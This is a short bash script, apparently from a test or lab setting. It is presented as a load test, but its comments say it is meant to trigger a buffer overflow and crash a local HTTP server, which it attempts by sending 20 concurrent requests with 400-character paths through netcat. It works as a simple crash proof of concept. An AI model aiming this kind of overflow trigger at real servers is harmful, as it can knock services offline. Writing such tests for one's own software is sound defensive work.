#!/bin/bash

# Load test script to trigger the buffer overflow in the HTTP server
# Sends requests with long paths that exceed the buffer size

echo "[*] Starting load test to trigger buffer overflow..."
echo "[*] Sending requests with increasingly long paths..."

# Send 20 concurrent requests with long paths
for i in {1..20}; do
    {
        # Create a very long path (400+ characters) to overflow the 256-byte buffer
        LONG_PATH=$(python3 -c "print('/' + 'A' * 400)")

        # Send HTTP request with the long path
        echo -e "GET $LONG_PATH HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 8080 > /dev/null 2>&1

        echo "[*] Sent request $i with path length: ${#LONG_PATH}"
    } &
done

# Wait for all background jobs to complete
wait

echo "[*] Load test complete. Check if server crashed."
